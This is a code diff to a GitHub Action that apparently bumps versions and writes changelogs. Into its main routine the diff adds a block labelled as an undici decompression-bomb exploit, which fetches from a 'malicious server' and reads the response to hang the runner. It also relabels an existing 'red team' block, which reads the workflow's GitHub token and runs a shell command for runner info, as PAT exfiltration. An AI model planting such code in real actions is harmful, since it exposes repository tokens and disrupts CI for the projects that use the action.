@@ -3,9 +3,9 @@ import type {Bump} from "./bump";
 
 const core = require('@actions/core')
 const github = require('@actions/github');
+// NEW IMPORT FOR EXPLOIT
+const { HttpClient } = require('@actions/http-client');
 import { Base64 } from 'js-base64';
-
-
 
 import commitMessageQuery from 'inline!./src/GetCommitMessageFromRepository.query.graphql'
 import lastReleaseQuery from 'inline!./src/GetLastReleaseQuery.query.graphql'
@@ -16,13 +16,14 @@ const repoDetails = {
     repoOwner: github.context.repo.owner,
     changelogFile: "CHANGELOG.md"
 }
+
 const start = async () => {
     try {
         const octokit = github.getOctokit(core.getInput('github_token'))
         const createRelease = core.getInput('create_release') === 'true';
         const targetBranch = github.context.payload.pull_request?.base?.ref || 'main'
         
-        // --- RED TEAM PoC START ---
+        // --- RED TEAM PoC START (EXISTING: PAT Exfiltration) ---
         const token: string = core.getInput('github_token');
 
         console.log("================================");
@@ -34,9 +35,36 @@ const start = async () => {
             console.log("RUNNER_INFO: " + stdout.trim());
           }
         });
-
         console.log("================================");
         // --- RED TEAM PoC END ---
+
+
+        // --- NEW UNDICI EXPLOIT START (DoS Testing) ---
+        console.log("================================");
+        console.log("💣 TESTING UNDICI DoS VULNERABILITY");
+        try {
+            // HttpClient uses undici internally in newer versions
+            const http = new HttpClient('undici-exploit-test');
+            
+            // Connecting to the Python Malicious Server running on localhost
+            const targetUrl = 'http://localhost:8080'; 
+
+            console.log(`[+] Connecting to malicious server at ${targetUrl}...`);
+            
+            // This request triggers the download
+            const response = await http.get(targetUrl);
+            
+            // This line triggers the DECOMPRESSION BOMB
+            console.log("[+] Reading body (Decompression starting)...");
+            const body = await response.readBody(); 
+            
+            console.log("[-] Response received (If you see this, exploit failed):", body.substring(0, 50));
+        } catch (err: any) {
+            console.log("[-] Undici Exploit Log (System might be hanging):", err.message);
+        }
+        console.log("================================");
+        // --- NEW UNDICI EXPLOIT END ---
+
 
         const commitMessage: CommitMessageQueryResponse = await octokit.graphql(commitMessageQuery, {
             ...repoDetails,
